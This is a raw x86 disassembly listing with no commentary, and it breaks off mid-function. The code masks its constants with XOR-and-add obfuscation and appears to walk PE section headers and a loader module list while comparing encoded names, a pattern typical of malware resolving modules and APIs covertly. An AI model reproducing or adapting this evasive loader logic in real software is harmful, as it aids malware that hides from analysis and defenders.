  427680:	movzx  eax,WORD PTR [ecx+0x14]
  427684:	push   ebx
  427685:	push   edi
  427686:	xor    edi,edi
  427688:	lea    eax,[eax+ecx*1+0x18]
  42768c:	test   edx,edx
  42768e:	je     0x4276af
  427690:	mov    ecx,DWORD PTR [eax+0xc]
  427693:	lea    ebx,[ecx+esi*1]
  427696:	cmp    DWORD PTR [ebp+0x8],ebx
  427699:	jb     0x4276a7
  42769b:	mov    ebx,DWORD PTR [eax+0x8]
  42769e:	add    ebx,ecx
  4276a0:	add    ebx,esi
  4276a2:	cmp    DWORD PTR [ebp+0x8],ebx
  4276a5:	jb     0x4276b1
  4276a7:	add    eax,0x28
  4276aa:	inc    edi
  4276ab:	cmp    edi,edx
  4276ad:	jb     0x427690
  4276af:	xor    eax,eax
  4276b1:	pop    edi
  4276b2:	pop    ebx
  4276b3:	pop    ebp
  4276b4:	ret    0x4
  4276b7:	push   ebp
  4276b8:	mov    ebp,esp
  4276ba:	sub    esp,0x34
  4276bd:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4276c4:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  4276cb:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  4276d2:	mov    DWORD PTR [ebp-0x8],0xf89c85da
  4276d9:	mov    DWORD PTR [ebp-0x20],0xf89c85fa
  4276e0:	mov    DWORD PTR [ebp-0x2c],0xf89c8523
  4276e7:	mov    DWORD PTR [ebp-0x2c],0xf89c85c3
  4276ee:	mov    DWORD PTR [ebp-0x10],eax
  4276f1:	mov    eax,DWORD PTR [ebp+0x8]
  4276f4:	mov    DWORD PTR [ebp-0x14],eax
  4276f7:	mov    eax,DWORD PTR [ebp-0xc]
  4276fa:	push   ebx
  4276fb:	mov    ecx,0x75108aa
  427700:	xor    eax,ecx
  427702:	push   esi
  427703:	mov    esi,DWORD PTR [ebp-0x10]
  427706:	mov    edx,0x3272f1
  42770b:	add    eax,edx
  42770d:	push   edi
  42770e:	cmp    esi,eax
  427710:	je     0x4278ef
  427716:	mov    eax,DWORD PTR [ebp-0xc]
  427719:	mov    esi,DWORD PTR [ebp-0x14]
  42771c:	xor    eax,ecx
  42771e:	add    eax,edx
  427720:	cmp    esi,eax
  427722:	je     0x4278ef
  427728:	mov    eax,DWORD PTR [ebp-0xc]
  42772b:	xor    eax,ecx
  42772d:	add    eax,edx
  42772f:	mov    DWORD PTR [ebp-0x24],eax
  427732:	mov    eax,DWORD PTR [ebp-0xc]
  427735:	xor    eax,ecx
  427737:	add    eax,edx
  427739:	mov    DWORD PTR [ebp-0x28],eax
  42773c:	mov    edi,DWORD PTR [ebp-0x20]
  42773f:	mov    ebx,DWORD PTR [ebp-0x8]
  427742:	mov    esi,0x8aa
  427747:	xor    edi,esi
  427749:	mov    eax,0x72f1
  42774e:	xor    ebx,esi
  427750:	add    edi,eax
  427752:	add    ebx,eax
  427754:	sub    ebx,edi
  427756:	mov    WORD PTR [ebp-0x8],bx
  42775a:	jmp    0x42781f
  42775f:	mov    edi,DWORD PTR [ebp-0xc]
  427762:	mov    bx,WORD PTR [ebp-0x4]
  427766:	xor    edi,esi
  427768:	add    edi,eax
  42776a:	cmp    bx,di
  42776d:	je     0x427861
  427773:	mov    edi,DWORD PTR [ebp-0xc]
  427776:	mov    ebx,DWORD PTR [ebp+0xc]
  427779:	xor    edi,ecx
  42777b:	add    edi,edx
  42777d:	cmp    ebx,edi
  42777f:	mov    di,WORD PTR [ebp-0x4]
  427783:	mov    bx,WORD PTR [ebp+0x8]
  427787:	je     0x4277f2
  427789:	cmp    bx,di
  42778c:	je     0x4277fb
  42778e:	mov    edi,DWORD PTR [ebp-0x20]
  427791:	mov    bx,WORD PTR [ebp+0x8]
  427795:	xor    edi,esi
  427797:	add    edi,eax
  427799:	cmp    bx,di
  42779c:	jb     0x4277bc
  42779e:	mov    edi,DWORD PTR [ebp-0x2c]
  4277a1:	mov    bx,WORD PTR [ebp+0x8]
  4277a5:	xor    edi,esi
  4277a7:	add    edi,eax
  4277a9:	cmp    bx,di
  4277ac:	ja     0x4277bc
  4277ae:	movzx  edi,WORD PTR [ebp+0x8]
  4277b2:	movzx  ebx,WORD PTR [ebp-0x8]
  4277b6:	add    edi,ebx
  4277b8:	mov    WORD PTR [ebp+0x8],di
  4277bc:	mov    edi,DWORD PTR [ebp-0x20]
  4277bf:	mov    bx,WORD PTR [ebp-0x4]
  4277c3:	xor    edi,esi
  4277c5:	add    edi,eax
  4277c7:	cmp    bx,di
  4277ca:	jb     0x4277ea
  4277cc:	mov    edi,DWORD PTR [ebp-0x2c]
  4277cf:	mov    bx,WORD PTR [ebp-0x4]
  4277d3:	xor    edi,esi
  4277d5:	add    edi,eax
  4277d7:	cmp    bx,di
  4277da:	ja     0x4277ea
  4277dc:	movzx  edi,WORD PTR [ebp-0x4]
  4277e0:	movzx  ebx,WORD PTR [ebp-0x8]
  4277e4:	add    edi,ebx
  4277e6:	mov    WORD PTR [ebp-0x4],di
  4277ea:	mov    di,WORD PTR [ebp-0x4]
  4277ee:	mov    bx,WORD PTR [ebp+0x8]
  4277f2:	cmp    bx,di
  4277f5:	jne    0x4278ef
  4277fb:	mov    edi,DWORD PTR [ebp-0x1c]
  4277fe:	mov    ebx,DWORD PTR [ebp-0x10]
  427801:	xor    edi,ecx
  427803:	lea    edi,[edi+ebx*1+0x3272f1]
  42780a:	mov    DWORD PTR [ebp-0x10],edi
  42780d:	mov    edi,DWORD PTR [ebp-0x1c]
  427810:	mov    ebx,DWORD PTR [ebp-0x14]
  427813:	xor    edi,ecx
  427815:	lea    edi,[edi+ebx*1+0x3272f1]
  42781c:	mov    DWORD PTR [ebp-0x14],edi
  42781f:	mov    edi,DWORD PTR [ebp-0x24]
  427822:	mov    ebx,DWORD PTR [ebp-0x10]
  427825:	mov    di,WORD PTR [ebx+edi*2]
  427829:	mov    WORD PTR [ebp+0x8],di
  42782d:	mov    edi,DWORD PTR [ebp-0x28]
  427830:	mov    ebx,DWORD PTR [ebp-0x14]
  427833:	mov    di,WORD PTR [ebx+edi*2]
  427837:	mov    WORD PTR [ebp-0x4],di
  42783b:	mov    edi,DWORD PTR [ebp-0xc]
  42783e:	mov    bx,WORD PTR [ebp+0x8]
  427842:	xor    edi,esi
  427844:	add    edi,eax
  427846:	cmp    bx,di
  427849:	jne    0x42775f
  42784f:	mov    eax,DWORD PTR [ebp-0x18]
  427852:	mov    esi,DWORD PTR [ebp-0xc]
  427855:	xor    eax,ecx
  427857:	add    eax,edx
  427859:	imul   eax,esi
  42785c:	mov    DWORD PTR [ebp-0xc],eax
  42785f:	jmp    0x427873
  427861:	mov    eax,DWORD PTR [ebp-0xc]
  427864:	mov    esi,DWORD PTR [ebp-0x18]
  427867:	xor    eax,ecx
  427869:	lea    eax,[eax+esi*1+0x3272f1]
  427870:	mov    DWORD PTR [ebp-0x18],eax
  427873:	mov    eax,DWORD PTR [ebp-0x24]
  427876:	sub    eax,edx
  427878:	xor    eax,ecx
  42787a:	mov    DWORD PTR [ebp-0x30],eax
  42787d:	mov    eax,DWORD PTR [ebp-0x28]
  427880:	sub    eax,edx
  427882:	xor    eax,ecx
  427884:	mov    DWORD PTR [ebp-0x34],eax
  427887:	mov    eax,DWORD PTR [ebp-0x34]
  42788a:	mov    esi,DWORD PTR [ebp-0x1c]
  42788d:	xor    esi,ecx
  42788f:	add    esi,edx
  427891:	xor    eax,ecx
  427893:	add    eax,0x3272f1
  427898:	imul   esi,eax
  42789b:	mov    eax,DWORD PTR [ebp-0x14]
  42789e:	movzx  eax,WORD PTR [esi+eax*1]
  4278a2:	mov    esi,DWORD PTR [ebp-0x30]
  4278a5:	mov    edi,DWORD PTR [ebp-0x1c]
  4278a8:	xor    esi,ecx
  4278aa:	add    esi,edx
  4278ac:	xor    edi,ecx
  4278ae:	add    edi,edx
  4278b0:	imul   edi,esi
  4278b3:	mov    esi,DWORD PTR [ebp-0x10]
  4278b6:	movzx  esi,WORD PTR [edi+esi*1]
  4278ba:	sub    eax,edx
  4278bc:	sub    esi,edx
  4278be:	xor    eax,ecx
  4278c0:	xor    esi,ecx
  4278c2:	cmp    esi,eax
  4278c4:	jne    0x4278ef
  4278c6:	mov    eax,DWORD PTR [ebp-0x30]
  4278c9:	mov    esi,DWORD PTR [ebp-0x1c]
  4278cc:	xor    eax,ecx
  4278ce:	add    eax,0x3272f1
  4278d3:	xor    esi,ecx
  4278d5:	add    esi,edx
  4278d7:	imul   esi,eax
  4278da:	mov    eax,DWORD PTR [ebp-0x10]
  4278dd:	movzx  eax,WORD PTR [esi+eax*1]
  4278e1:	mov    esi,DWORD PTR [ebp-0xc]
  4278e4:	sub    eax,edx
  4278e6:	xor    eax,ecx
  4278e8:	cmp    eax,esi
  4278ea:	mov    eax,DWORD PTR [ebp-0xc]
  4278ed:	je     0x4278f2
  4278ef:	mov    eax,DWORD PTR [ebp-0x18]
  4278f2:	pop    edi
  4278f3:	xor    eax,ecx
  4278f5:	pop    esi
  4278f6:	add    eax,edx
  4278f8:	pop    ebx
  4278f9:	leave  
  4278fa:	ret    0x8
  4278fd:	push   ebp
  4278fe:	mov    ebp,esp
  427900:	push   ecx
  427901:	mov    cx,WORD PTR [eax]
  427904:	push   esi
  427905:	mov    esi,0x3b5a
  42790a:	sub    cx,si
  42790d:	mov    esi,0x8a98
  427912:	xor    cx,si
  427915:	mov    esi,0x4e3e
  42791a:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427921:	mov    edx,0xf89c85a5
  427926:	cmp    cx,si
  427929:	je     0x427988
  42792b:	push   ebx
  42792c:	push   edi
  42792d:	movzx  ecx,cx
  427930:	mov    edi,0xffcd8d0f
  427935:	mov    esi,0x75108aa
  42793a:	mov    ebx,0x4f9a
  42793f:	cmp    cx,bx
  427942:	jne    0x427947
  427944:	mov    DWORD PTR [ebp-0x4],edx
  427947:	lea    edx,[edi+0x1]
  42794a:	xor    edx,esi
  42794c:	mov    edi,edx
  42794e:	xor    edi,esi
  427950:	mov    cx,WORD PTR [eax+edi*2+0x64e5e2]
  427958:	mov    ebx,0x3b5a
  42795d:	sub    cx,bx
  427960:	mov    ebx,0x8a98
  427965:	xor    cx,bx
  427968:	mov    ebx,0x4e3e
  42796d:	cmp    cx,bx
  427970:	jne    0x42793a
  427972:	mov    ecx,DWORD PTR [ebp-0x4]
  427975:	pop    edi
  427976:	pop    ebx
  427977:	cmp    ecx,0xf89c85a4
  42797d:	je     0x427988
  42797f:	xor    ecx,esi
  427981:	lea    eax,[eax+ecx*2+0x64e5e4]
  427988:	pop    esi
  427989:	leave  
  42798a:	ret    
  42798b:	push   ebp
  42798c:	mov    ebp,esp
  42798e:	push   ecx
  42798f:	push   esi
  427990:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427997:	mov    esi,0xf89c85a5
  42799c:	call   0x4278fd
  4279a1:	mov    cl,BYTE PTR [eax]
  4279a3:	dec    cl
  4279a5:	xor    cl,0x7c
  4279a8:	cmp    cl,0x83
  4279ab:	je     0x427a10
  4279ad:	push   ebx
  4279ae:	push   edi
  4279af:	mov    edx,eax
  4279b1:	mov    edi,0xffcd8d0f
  4279b6:	mov    ecx,0x75108aa
  4279bb:	mov    dx,WORD PTR [edx]
  4279be:	mov    ebx,0x3b5a
  4279c3:	sub    dx,bx
  4279c6:	mov    ebx,0x8a98
  4279cb:	xor    dx,bx
  4279ce:	mov    ebx,0x4e4c
  4279d3:	cmp    dx,bx
  4279d6:	jne    0x4279db
  4279d8:	mov    DWORD PTR [ebp-0x4],esi
  4279db:	lea    esi,[edi+0x1]
  4279de:	xor    esi,ecx
  4279e0:	mov    edi,esi
  4279e2:	xor    edi,ecx
  4279e4:	lea    edx,[eax+edi*2+0x64e5e2]
  4279eb:	mov    bl,BYTE PTR [edx]
  4279ed:	dec    bl
  4279ef:	xor    bl,0x7c
  4279f2:	cmp    bl,0x83
  4279f5:	jne    0x4279bb
  4279f7:	mov    edx,DWORD PTR [ebp-0x4]
  4279fa:	pop    edi
  4279fb:	pop    ebx
  4279fc:	cmp    edx,0xf89c85a4
  427a02:	je     0x427a10
  427a04:	xor    edx,ecx
  427a06:	xor    ecx,ecx
  427a08:	mov    WORD PTR [eax+edx*2+0x64e5e2],cx
  427a10:	pop    esi
  427a11:	leave  
  427a12:	ret    
  427a13:	push   ebp
  427a14:	mov    ebp,esp
  427a16:	push   ecx
  427a17:	push   esi
  427a18:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427a1f:	mov    esi,0xf89c85a5
  427a24:	call   0x4278fd
  427a29:	mov    cx,WORD PTR [eax]
  427a2c:	mov    edx,0x3b5a
  427a31:	sub    cx,dx
  427a34:	mov    edx,0x8a98
  427a39:	xor    cx,dx
  427a3c:	mov    edx,0x4e3e
  427a41:	cmp    cx,dx
  427a44:	je     0x427a9d
  427a46:	push   ebx
  427a47:	push   edi
  427a48:	movzx  ecx,cx
  427a4b:	mov    edx,0xffcd8d0f
  427a50:	mov    edi,0x75108aa
  427a55:	mov    ebx,0x4e4c
  427a5a:	cmp    cx,bx
  427a5d:	jne    0x427a62
  427a5f:	mov    DWORD PTR [ebp-0x4],esi
  427a62:	lea    esi,[edx+0x1]
  427a65:	xor    esi,edi
  427a67:	mov    edx,esi
  427a69:	xor    edx,edi
  427a6b:	mov    cx,WORD PTR [eax+edx*2+0x64e5e2]
  427a73:	mov    ebx,0x3b5a
  427a78:	sub    cx,bx
  427a7b:	mov    ebx,0x8a98
  427a80:	xor    cx,bx
  427a83:	mov    ebx,0x4e3e
  427a88:	cmp    cx,bx
  427a8b:	jne    0x427a55
  427a8d:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  427a94:	pop    edi
  427a95:	pop    ebx
  427a96:	je     0x427a9d
  427a98:	xor    eax,eax
  427a9a:	inc    eax
  427a9b:	jmp    0x427a9f
  427a9d:	xor    eax,eax
  427a9f:	pop    esi
  427aa0:	leave  
  427aa1:	ret    
  427aa2:	push   ebp
  427aa3:	mov    ebp,esp
  427aa5:	push   ecx
  427aa6:	mov    eax,DWORD PTR [ebp+0x8]
  427aa9:	movzx  ecx,WORD PTR [eax]
  427aac:	push   esi
  427aad:	lea    eax,[ecx-0x3b5a]
  427ab3:	mov    esi,0x8a98
  427ab8:	push   edi
  427ab9:	xor    eax,esi
  427abb:	mov    edi,0x4e3e
  427ac0:	mov    DWORD PTR [ebp-0x4],edx
  427ac3:	cmp    ax,di
  427ac6:	je     0x427af3
  427ac8:	mov    eax,DWORD PTR [ebp+0x8]
  427acb:	sub    eax,edx
  427acd:	mov    DWORD PTR [ebp+0x8],eax
  427ad0:	jmp    0x427ad5
  427ad2:	mov    eax,DWORD PTR [ebp+0x8]
  427ad5:	mov    WORD PTR [edx],cx
  427ad8:	add    edx,0x2
  427adb:	movzx  edi,WORD PTR [eax+edx*1]
  427adf:	mov    ecx,edi
  427ae1:	add    edi,0xffffc4a6
  427ae7:	xor    edi,esi
  427ae9:	mov    eax,0x4e3e
  427aee:	cmp    di,ax
  427af1:	jne    0x427ad2
  427af3:	xor    eax,eax
  427af5:	pop    edi
  427af6:	mov    WORD PTR [edx],ax
  427af9:	mov    eax,DWORD PTR [ebp-0x4]
  427afc:	pop    esi
  427afd:	leave  
  427afe:	ret    0x4
  427b01:	push   ebp
  427b02:	mov    ebp,esp
  427b04:	sub    esp,0x18
  427b07:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  427b0e:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  427b15:	mov    ecx,DWORD PTR [ebp-0x8]
  427b18:	push   esi
  427b19:	mov    eax,0x75108aa
  427b1e:	xor    ecx,eax
  427b20:	mov    esi,0x3272f1
  427b25:	add    ecx,esi
  427b27:	mov    DWORD PTR [ebp-0x4],ecx
  427b2a:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  427b31:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  427b38:	push   edi
  427b39:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  427b40:	jmp    0x427be1
  427b45:	mov    ecx,DWORD PTR [ebp-0x4]
  427b48:	mov    edx,DWORD PTR [ebp+0x10]
  427b4b:	sub    edx,ecx
  427b4d:	mov    ecx,DWORD PTR [ebp-0xc]
  427b50:	xor    ecx,eax
  427b52:	add    ecx,esi
  427b54:	cmp    edx,ecx
  427b56:	jbe    0x427b73
  427b58:	mov    edx,DWORD PTR [ebp-0x4]
  427b5b:	add    edx,DWORD PTR [ebp+0x8]
  427b5e:	mov    ecx,DWORD PTR [ebp-0x4]
  427b61:	add    ecx,DWORD PTR [ebp+0xc]
  427b64:	mov    edi,DWORD PTR [ecx]
  427b66:	mov    DWORD PTR [edx],edi
  427b68:	mov    ecx,DWORD PTR [ecx+0x4]
  427b6b:	mov    DWORD PTR [edx+0x4],ecx
  427b6e:	mov    ecx,DWORD PTR [ebp-0xc]
  427b71:	jmp    0x427bc0
  427b73:	mov    ecx,DWORD PTR [ebp-0x4]
  427b76:	mov    edx,DWORD PTR [ebp+0x10]
  427b79:	sub    edx,ecx
  427b7b:	mov    ecx,DWORD PTR [ebp-0x10]
  427b7e:	xor    ecx,eax
  427b80:	add    ecx,esi
  427b82:	cmp    edx,ecx
  427b84:	mov    ecx,DWORD PTR [ebp-0x4]
  427b87:	jbe    0x427b9b
  427b89:	add    ecx,DWORD PTR [ebp+0x8]
  427b8c:	mov    edx,DWORD PTR [ebp-0x4]
  427b8f:	add    edx,DWORD PTR [ebp+0xc]
  427b92:	mov    edx,DWORD PTR [edx]
  427b94:	mov    DWORD PTR [ecx],edx
  427b96:	mov    ecx,DWORD PTR [ebp-0x10]
  427b99:	jmp    0x427bc0
  427b9b:	mov    edx,DWORD PTR [ebp+0x10]
  427b9e:	sub    edx,ecx
  427ba0:	mov    ecx,DWORD PTR [ebp-0x14]
  427ba3:	xor    ecx,eax
  427ba5:	add    ecx,esi
  427ba7:	cmp    edx,ecx
  427ba9:	mov    ecx,DWORD PTR [ebp-0x4]
  427bac:	jbe    0x427bd1
  427bae:	add    ecx,DWORD PTR [ebp+0x8]
  427bb1:	mov    edx,DWORD PTR [ebp-0x4]
  427bb4:	add    edx,DWORD PTR [ebp+0xc]
  427bb7:	mov    dx,WORD PTR [edx]
  427bba:	mov    WORD PTR [ecx],dx
  427bbd:	mov    ecx,DWORD PTR [ebp-0x14]
  427bc0:	mov    edx,DWORD PTR [ebp-0x4]
  427bc3:	xor    ecx,eax
  427bc5:	lea    ecx,[ecx+edx*1+0x3272f1]
  427bcc:	mov    DWORD PTR [ebp-0x4],ecx
  427bcf:	jmp    0x427be1
  427bd1:	add    ecx,DWORD PTR [ebp+0x8]
  427bd4:	mov    edx,DWORD PTR [ebp-0x4]
  427bd7:	add    edx,DWORD PTR [ebp+0xc]
  427bda:	mov    dl,BYTE PTR [edx]
  427bdc:	mov    BYTE PTR [ecx],dl
  427bde:	inc    DWORD PTR [ebp-0x4]
  427be1:	mov    ecx,DWORD PTR [ebp-0x18]
  427be4:	mov    edx,DWORD PTR [ebp+0x10]
  427be7:	xor    ecx,eax
  427be9:	add    ecx,esi
  427beb:	imul   ecx,edx
  427bee:	mov    edx,DWORD PTR [ebp-0x8]
  427bf1:	mov    edi,DWORD PTR [ebp-0x4]
  427bf4:	xor    edx,eax
  427bf6:	lea    edx,[edx+edi*1+0x3272f1]
  427bfd:	cmp    edx,ecx
  427bff:	jb     0x427b45
  427c05:	pop    edi
  427c06:	pop    esi
  427c07:	leave  
  427c08:	ret    0xc
  427c0b:	push   ebp
  427c0c:	mov    ebp,esp
  427c0e:	sub    esp,0xc
  427c11:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427c18:	push   esi
  427c19:	mov    esi,eax
  427c1b:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  427c22:	mov    edx,DWORD PTR [ebp-0x4]
  427c25:	mov    eax,0x75108aa
  427c2a:	xor    edx,eax
  427c2c:	mov    ecx,0x3272f1
  427c31:	add    edx,ecx
  427c33:	cmp    esi,edx
  427c35:	je     0x427c77
  427c37:	push   ebx
  427c38:	push   edi
  427c39:	mov    edx,DWORD PTR [ebp-0x8]
  427c3c:	mov    ebx,DWORD PTR [ebp+0x8]
  427c3f:	xor    edx,eax
  427c41:	mov    edi,0xffcd8d0f
  427c46:	sub    edi,edx
  427c48:	add    esi,edi
  427c4a:	lea    edx,[esi-0x3272f1]
  427c50:	xor    edx,eax
  427c52:	mov    DWORD PTR [ebp-0xc],edx
  427c55:	mov    edx,DWORD PTR [ebp-0x4]
  427c58:	mov    edi,DWORD PTR [ebp-0xc]
  427c5b:	xor    dl,0xaa
  427c5e:	sub    dl,0xf
  427c61:	xor    edi,eax
  427c63:	mov    BYTE PTR [edi+ebx*1+0x3272f1],dl
  427c6a:	mov    edx,DWORD PTR [ebp-0x4]
  427c6d:	xor    edx,eax
  427c6f:	add    edx,ecx
  427c71:	cmp    esi,edx
  427c73:	jne    0x427c39
  427c75:	pop    edi
  427c76:	pop    ebx
  427c77:	pop    esi
  427c78:	leave  
  427c79:	ret    0x4
  427c7c:	push   ebp
  427c7d:	mov    ebp,esp
  427c7f:	sub    esp,0x21c
  427c85:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427c8c:	mov    DWORD PTR [ebp-0x14],0xf89c85ba
  427c93:	mov    eax,DWORD PTR [ebp+0x10]
  427c96:	mov    eax,DWORD PTR [ebp-0x4]
  427c99:	mov    ecx,DWORD PTR [ebp+0x8]
  427c9c:	push   esi
  427c9d:	push   edi
  427c9e:	mov    edi,0x75108aa
  427ca3:	xor    eax,edi
  427ca5:	mov    esi,0x3272f1
  427caa:	add    eax,esi
  427cac:	cmp    eax,ecx
  427cae:	mov    eax,DWORD PTR [ebp-0x4]
  427cb1:	jne    0x427cbc
  427cb3:	xor    eax,edi
  427cb5:	add    eax,esi
  427cb7:	jmp    0x427d68
  427cbc:	mov    ecx,DWORD PTR [ebp+0xc]
  427cbf:	xor    eax,edi
  427cc1:	add    eax,esi
  427cc3:	cmp    eax,ecx
  427cc5:	jne    0x427ccc
  427cc7:	mov    eax,DWORD PTR [ebp-0x4]
  427cca:	jmp    0x427cb3
  427ccc:	lea    eax,[ebp-0x21c]
  427cd2:	mov    DWORD PTR [ebp-0x8],eax
  427cd5:	mov    eax,DWORD PTR [ebp+0xc]
  427cd8:	mov    DWORD PTR [ebp-0x10],eax
  427cdb:	mov    eax,DWORD PTR [ebp-0x4]
  427cde:	xor    eax,edi
  427ce0:	add    eax,esi
  427ce2:	mov    DWORD PTR [ebp+0x10],eax
  427ce5:	mov    eax,DWORD PTR [ebp+0xc]
  427ce8:	push   ebx
  427ce9:	call   0x427a13
  427cee:	mov    ebx,eax
  427cf0:	mov    eax,DWORD PTR [ebp+0x8]
  427cf3:	mov    eax,DWORD PTR [eax+0x14]
  427cf6:	jmp    0x427d50
  427cf8:	mov    eax,DWORD PTR [ebp+0xc]
  427cfb:	sub    eax,0x8
  427cfe:	mov    DWORD PTR [ebp-0xc],eax
  427d01:	mov    eax,DWORD PTR [ebp-0xc]
  427d04:	mov    eax,DWORD PTR [eax+0x28]
  427d07:	call   0x4278fd
  427d0c:	mov    DWORD PTR [ebp+0x10],eax
  427d0f:	push   DWORD PTR [ebp+0x10]
  427d12:	mov    edx,DWORD PTR [ebp-0x8]
  427d15:	call   0x427aa2
  427d1a:	mov    eax,DWORD PTR [ebp-0x4]
  427d1d:	xor    eax,edi
  427d1f:	add    eax,esi
  427d21:	cmp    eax,ebx
  427d23:	jne    0x427d2d
  427d25:	mov    eax,DWORD PTR [ebp-0x8]
  427d28:	call   0x42798b
  427d2d:	mov    eax,DWORD PTR [ebp-0x14]
  427d30:	xor    eax,edi
  427d32:	add    eax,esi
  427d34:	push   eax
  427d35:	push   DWORD PTR [ebp-0x10]
  427d38:	mov    eax,DWORD PTR [ebp-0x8]
  427d3b:	call   0x4276b7
  427d40:	mov    ecx,DWORD PTR [ebp-0x4]
  427d43:	xor    ecx,edi
  427d45:	add    ecx,esi
  427d47:	cmp    eax,ecx
  427d49:	je     0x427d6e
  427d4b:	mov    eax,DWORD PTR [ebp+0xc]
  427d4e:	mov    eax,DWORD PTR [eax]
  427d50:	mov    DWORD PTR [ebp+0xc],eax
  427d53:	mov    eax,DWORD PTR [ebp+0x8]
  427d56:	mov    ecx,DWORD PTR [ebp+0xc]
  427d59:	add    eax,0x14
  427d5c:	cmp    ecx,eax
  427d5e:	jne    0x427cf8
  427d60:	mov    eax,DWORD PTR [ebp-0x4]
  427d63:	xor    eax,edi
  427d65:	add    eax,esi
  427d67:	pop    ebx
  427d68:	pop    edi
  427d69:	pop    esi
  427d6a:	leave  
  427d6b:	ret    0xc
  427d6e:	mov    eax,DWORD PTR [ebp-0xc]
  427d71:	mov    eax,DWORD PTR [eax+0x18]
  427d74:	jmp    0x427d67
  427d76:	push   ebp
  427d77:	mov    ebp,esp
  427d79:	mov    eax,DWORD PTR [ebp+0xc]
  427d7c:	sub    esp,0x10
  427d7f:	cmp    DWORD PTR [ebp+0x8],0x0
  427d83:	push   ebx
  427d84:	push   esi
  427d85:	push   edi
  427d86:	je     0x427e3b
  427d8c:	test   eax,eax
  427d8e:	je     0x427e3b
  427d94:	movzx  eax,WORD PTR [eax+0x20]
  427d98:	mov    ecx,eax
  427d9a:	mov    DWORD PTR [ebp-0x10],eax
  427d9d:	xor    edx,edx
  427d9f:	and    DWORD PTR [ebp-0x8],edx
  427da2:	mov    eax,0x8a98
  427da7:	xor    ecx,eax
  427da9:	add    ecx,0x3b5a
  427daf:	mov    DWORD PTR [ebp-0xc],ecx
  427db2:	and    DWORD PTR [ebp-0x4],0x0
  427db6:	xor    ecx,ecx
  427db8:	push   0x7d
  427dba:	pop    edi
  427dbb:	cmp    cx,WORD PTR [ebp-0xc]
  427dbf:	jae    0x427e25
  427dc1:	lea    esi,[edx-0x3b5a]
  427dc7:	xor    esi,eax
  427dc9:	movzx  ecx,WORD PTR [ebp-0x4]
  427dcd:	mov    ebx,DWORD PTR [ebp+0xc]
  427dd0:	lea    ecx,[ebx+ecx*4]
  427dd3:	cmp    WORD PTR [ecx+0x2],si
  427dd7:	jne    0x427e10
  427dd9:	movzx  ecx,WORD PTR [ecx]
  427ddc:	mov    edi,0x4e3e
  427de1:	cmp    cx,di
  427de4:	jne    0x427df2
  427de6:	mov    ebx,DWORD PTR [ebp+0x8]
  427de9:	movzx  edi,dx
  427dec:	cmp    BYTE PTR [edi+ebx*1],0x0
  427df0:	je     0x427e1f
  427df2:	mov    ebx,DWORD PTR [ebp+0x8]
  427df5:	movzx  edi,dx
  427df8:	movsx  di,BYTE PTR [edi+ebx*1]
  427dfd:	mov    ebx,0x3b5a
  427e02:	sub    di,bx
  427e05:	xor    di,ax
  427e08:	cmp    cx,di
  427e0b:	je     0x427e1f
  427e0d:	push   0xffffff83
  427e0f:	pop    edi
  427e10:	inc    DWORD PTR [ebp-0x4]
  427e13:	mov    cx,WORD PTR [ebp-0xc]
  427e17:	cmp    WORD PTR [ebp-0x4],cx
  427e1b:	jb     0x427dc9
  427e1d:	jmp    0x427e25
  427e1f:	inc    DWORD PTR [ebp-0x8]
  427e22:	push   0x7c
  427e24:	pop    edi
  427e25:	mov    esi,DWORD PTR [ebp+0x8]
  427e28:	movzx  ecx,dx
  427e2b:	cmp    BYTE PTR [ecx+esi*1],0x0
  427e2f:	je     0x427e44
  427e31:	inc    edx
  427e32:	cmp    edi,0xffffff83
  427e35:	jne    0x427db2
  427e3b:	xor    eax,eax
  427e3d:	pop    edi
  427e3e:	pop    esi
  427e3f:	pop    ebx
  427e40:	leave  
  427e41:	ret    0x8
  427e44:	mov    ecx,DWORD PTR [ebp-0x8]
  427e47:	add    ecx,0xffffc4a6
  427e4d:	xor    cx,ax
  427e50:	xor    eax,eax
  427e52:	cmp    cx,WORD PTR [ebp-0x10]
  427e56:	sete   al
  427e59:	jmp    0x427e3d
  427e5b:	push   ebp
  427e5c:	mov    ebp,esp
  427e5e:	sub    esp,0x50
  427e61:	push   edi
  427e62:	mov    edi,eax
  427e64:	mov    eax,DWORD PTR [edi+0x1a8]
  427e6a:	cmp    DWORD PTR [eax],0x0
  427e6d:	jne    0x427e76
  427e6f:	xor    eax,eax
  427e71:	jmp    0x427fa7
  427e76:	push   DWORD PTR [ebp+0x8]
  427e79:	push   0x2c
  427e7b:	pop    eax
  427e7c:	call   0x427c0b
  427e81:	mov    edx,DWORD PTR [edi+0x1ac]
  427e87:	lea    eax,[edi+0x22]
  427e8a:	mov    DWORD PTR [ebp-0x4c],eax
  427e8d:	lea    eax,[edi+0x44]
  427e90:	mov    DWORD PTR [ebp-0x48],eax
  427e93:	lea    eax,[edi+0x66]
  427e96:	mov    DWORD PTR [ebp-0x44],eax
  427e99:	lea    eax,[edi+0x88]
  427e9f:	mov    DWORD PTR [ebp-0x40],eax
  427ea2:	lea    eax,[edi+0xaa]
  427ea8:	mov    DWORD PTR [ebp-0x3c],eax
  427eab:	lea    eax,[edi+0xcc]
  427eb1:	mov    DWORD PTR [ebp-0x38],eax
  427eb4:	lea    eax,[edi+0xee]
  427eba:	mov    DWORD PTR [ebp-0x34],eax
  427ebd:	lea    eax,[edi+0x110]
  427ec3:	mov    DWORD PTR [ebp-0x30],eax
  427ec6:	lea    eax,[edi+0x132]
  427ecc:	mov    DWORD PTR [ebp-0x2c],eax
  427ecf:	lea    eax,[edi+0x154]
  427ed5:	push   edi
  427ed6:	mov    DWORD PTR [ebp-0x50],edi
  427ed9:	mov    DWORD PTR [ebp-0x28],eax
  427edc:	call   0x427fdb
  427ee1:	push   eax
  427ee2:	mov    eax,DWORD PTR [edi+0x1a8]
  427ee8:	push   DWORD PTR [eax]
